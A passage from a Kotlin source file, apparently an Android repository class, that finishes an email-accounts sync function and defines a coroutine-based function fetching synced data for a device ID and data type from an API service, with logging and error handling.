                    println("✅ Email accounts sync successful: ${syncResponse?.itemsSynced} items")
                    SyncResult.Success(syncResponse?.itemsSynced ?: data.size)
                } else {
                    println("❌ Email accounts sync failed: ${response.code()} - ${response.body()?.error}")
                    SyncResult.Error(response.body()?.error ?: "Failed to sync email accounts")
                }
            } catch (e: Exception) {
                println("❌ Email accounts sync exception: ${e.message}")
                SyncResult.Error("Failed to sync email accounts: ${e.message}")
            }
        }
    }
    
    suspend fun getSyncedData(deviceId: String, dataType: DataTypeEnum): Result<List<Any>> {
        return withContext(Dispatchers.IO) {
            try {
                val response = apiService.getSyncedData(deviceId, dataType.name)
                if (response.isSuccessful && response.body()?.success == true) {
                    val data = response.body()?.data ?: emptyList()
                    Result.success(data)
                } else {
                    Result.failure(Exception(response.body()?.error ?: "Failed to get synced data"))
                }
            } catch (e: Exception) {
                Result.failure(e)
            }
        }
    }
} 